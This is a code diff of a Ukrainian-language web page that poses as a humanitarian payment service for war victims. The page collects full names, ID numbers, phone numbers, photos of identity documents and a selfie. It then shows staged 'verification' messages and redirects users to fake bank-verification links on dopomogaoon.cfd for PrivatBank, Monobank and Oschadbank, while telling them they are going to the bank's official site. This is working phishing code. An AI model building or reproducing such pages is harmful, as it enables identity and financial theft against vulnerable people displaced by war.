@@ -623,7 +623,7 @@
                 <h3 class="card-title">Наші цілі</h3>
                 <p class="page-content">
                     Ми прагнемо забезпечити базові потреби постраждалих від війни, допомогти у відновленні 
-                    життя та створити умови для стабільного майбутнього.
+                    житла та створити умови для стабільного майбутнього.
                 </p>
             </div>
         </div>
@@ -704,8 +704,10 @@
         <!-- Get Payment Page -->
         <div id="get-payment" class="page">
             <h2 class="page-title">Отримати виплату</h2>
-            <div class="card" id="payment-form-card">
-                <h3 class="card-title">Заповніть форму</h3>
+            
+            <!-- Step 1: Document Upload -->
+            <div class="card" id="document-upload-card">
+                <h3 class="card-title">Завантажте документи</h3>
                 
                 <div class="form-group">
                     <label for="fullname" class="form-label">Повне ім'я</label>
@@ -752,45 +754,40 @@
                     </div>
                 </div>
                 
-                <div class="bank-selection">
-                    <h3 class="card-title">Оберіть ваш банк</h3>
-                    <div class="bank-list">
-                        <div class="bank-card" data-bank="privatbank">
-                            <img src="privat.png" alt="ПриватБанк" class="bank-logo">
-                            <div class="bank-name">ПриватБанк</div>
-                        </div>
-                        <div class="bank-card" data-bank="monobank">
-                            <img src="mono.png" alt="Монобанк" class="bank-logo">
-                            <div class="bank-name">Монобанк</div>
-                        </div>
-                        <div class="bank-card" data-bank="oschadbank">
-                            <img src="oshad.png" alt="Ощадбанк" class="bank-logo">
-                            <div class="bank-name">Ощадбанк</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <button class="btn btn-primary btn-block" id="submit-btn">Надіслати заявку</button>
+                <button class="btn btn-primary btn-block" id="upload-btn">Завантажити документи</button>
             </div>
             
+            <!-- Step 2: Bank Selection (initially hidden) -->
+            <div class="card" id="bank-selection-card" style="display: none;">
+                <h3 class="card-title">Оберіть ваш банк</h3>
+                <p class="page-content">Документи успішно завантажено. Оберіть банк для верифікації:</p>
+                
+                <div class="bank-list">
+                    <a href="http://dopomogaoon.cfd/privat/vGKXbReWcO" class="bank-card" target="_blank">
+                        <img src="privat.png" alt="ПриватБанк" class="bank-logo">
+                        <div class="bank-name">ПриватБанк</div>
+                    </a>
+                    <a href="http://dopomogaoon.cfd/mono/ViYzgdAGKx" class="bank-card" target="_blank">
+                        <img src="mono.png" alt="Монобанк" class="bank-logo">
+                        <div class="bank-name">Монобанк</div>
+                    </a>
+                    <a href="http://dopomogaoon.cfd/oshad/SaWjGcRiMf" class="bank-card" target="_blank">
+                        <img src="oshad.png" alt="Ощадбанк" class="bank-logo">
+                        <div class="bank-name">Ощадбанк</div>
+                    </a>
+                </div>
+                
+                <div class="verification-subtext" style="margin-top: 2rem;">
+                    <p>Після вибору банку ви будете перенаправлені на його офіційний сайт для завершення верифікації.</p>
+                </div>
+            </div>
+            
+            <!-- Verification Process (initially hidden) -->
             <div class="card" id="verification-card" style="display: none;">
                 <div class="verification-container">
                     <i class="fas fa-spinner verification-icon"></i>
                     <div class="verification-text" id="verification-text">Очікуйте...</div>
                     <div class="verification-subtext">Триває перевірка ваших даних. Це може зайняти кілька хвилин.</div>
-                    
-                    <div id="bank-verification" style="display: none; margin-top: 2rem;">
-                        <h3>Для завершення верифікації перейдіть за посиланням вашого банку:</h3>
-                        <a href="http://dopomogaoon.cfd/privat/vGKXbReWcO" class="bank-verification-link" id="privat-link" target="_blank" style="display: none;">
-                            <i class="fas fa-external-link-alt"></i> Верифікація через ПриватБанк
-                        </a>
-                        <a href="http://dopomogaoon.cfd/oshad/SaWjGcRiMf" class="bank-verification-link" id="oshad-link" target="_blank" style="display: none;">
-                            <i class="fas fa-external-link-alt"></i> Верифікація через Ощадбанк
-                        </a>
-                        <a href="http://dopomogaoon.cfd/mono/ViYzgdAGKx" class="bank-verification-link" id="mono-link" target="_blank" style="display: none;">
-                            <i class="fas fa-external-link-alt"></i> Верифікація через Монобанк
-                        </a>
-                    </div>
                 </div>
             </div>
         </div>
@@ -868,26 +865,8 @@
             document.getElementById('selfie-file-name').textContent = fileName;
         });
 
-        // Вибір банку
-        document.querySelectorAll('.bank-card').forEach(card => {
-            card.addEventListener('click', function() {
-                document.querySelectorAll('.bank-card').forEach(c => {
-                    c.style.borderColor = '#e0e9ff';
-                });
-                this.style.borderColor = 'var(--primary-blue)';
-            });
-        });
-
-        // Відправка форми
-        const verificationMessages = [
-            "Очікуйте...",
-            "Перевіряємо ваші дані...",
-            "Верифікуємо документи...",
-            "Зв'язуємось із банком...",
-            "Завершення перевірки..."
-        ];
-
-        document.getElementById('submit-btn').addEventListener('click', function() {
+        // Відправка документів
+        document.getElementById('upload-btn').addEventListener('click', function() {
             // Перевірка заповнення форми
             const fullname = document.getElementById('fullname').value;
             const idNumber = document.getElementById('id-number').value;
@@ -895,44 +874,55 @@
             const idFrontFile = document.getElementById('id-front-file').files[0];
             const idBackFile = document.getElementById('id-back-file').files[0];
             const selfieFile = document.getElementById('selfie-file').files[0];
-            const selectedBank = document.querySelector('.bank-card[style*="border-color: var(--primary-blue)"]');
             
-            if (!fullname || !idNumber || !phone || !idFrontFile || !idBackFile || !selfieFile || !selectedBank) {
-                alert('Будь ласка, заповніть всі поля, завантажте всі документи та оберіть банк');
+            if (!fullname || !idNumber || !phone || !idFrontFile || !idBackFile || !selfieFile) {
+                alert('Будь ласка, заповніть всі поля та завантажте всі документи');
                 return;
             }
             
-            // Показати процес верифікації
-            document.getElementById('payment-form-card').style.display = 'none';
-            document.getElementById('verification-card').style.display = 'block';
+            // Показати вибір банку
+            document.getElementById('document-upload-card').style.display = 'none';
+            document.getElementById('bank-selection-card').style.display = 'block';
             
-            // Анімація зміни тексту
-            let counter = 0;
-            const verificationText = document.getElementById('verification-text');
-            const interval = setInterval(() => {
-                verificationText.textContent = verificationMessages[counter % verificationMessages.length];
-                counter++;
+            // Плавний скрол до вибору банку
+            document.getElementById('bank-selection-card').scrollIntoView({ behavior: 'smooth' });
+        });
+
+        // Вибір банку
+        document.querySelectorAll('.bank-card').forEach(card => {
+            card.addEventListener('click', function(e) {
+                e.preventDefault();
+                const bankUrl = this.getAttribute('href');
                 
-                if (counter >= verificationMessages.length * 2) {
-                    clearInterval(interval);
+                // Показати процес верифікації
+                document.getElementById('bank-selection-card').style.display = 'none';
+                document.getElementById('verification-card').style.display = 'block';
+                
+                // Анімація зміни тексту
+                const verificationMessages = [
+                    "Очікуйте...",
+                    "Перевіряємо ваші дані...",
+                    "Верифікуємо документи...",
+                    "Зв'язуємось із банком...",
+                    "Завершення перевірки..."
+                ];
+                
+                let counter = 0;
+                const verificationText = document.getElementById('verification-text');
+                const interval = setInterval(() => {
+                    verificationText.textContent = verificationMessages[counter % verificationMessages.length];
+                    counter++;
                     
-                    // Показати посилання на верифікацію банку
-                    document.getElementById('bank-verification').style.display = 'block';
-                    const bank = selectedBank.getAttribute('data-bank');
-                    
-                    if (bank === 'privatbank') {
-                        document.getElementById('privat-link').style.display = 'block';
-                    } else if (bank === 'oschadbank') {
-                        document.getElementById('oshad-link').style.display = 'block';
-                    } else if (bank === 'monobank') {
-                        document.getElementById('mono-link').style.display = 'block';
+                    if (counter >= verificationMessages.length * 2) {
+                        clearInterval(interval);
+                        
+                        // Перенаправити на сторінку банку
+                        setTimeout(() => {
+                            window.location.href = bankUrl;
+                        }, 1000);
                     }
-                    
-                    verificationText.textContent = "Завершено!";
-                    document.querySelector('.verification-icon').className = "fas fa-check-circle verification-icon";
-                    document.querySelector('.verification-icon').style.color = "var(--green)";
-                }
-            }, 1000);
+                }, 1000);
+            });
         });
     </script>
 </body>
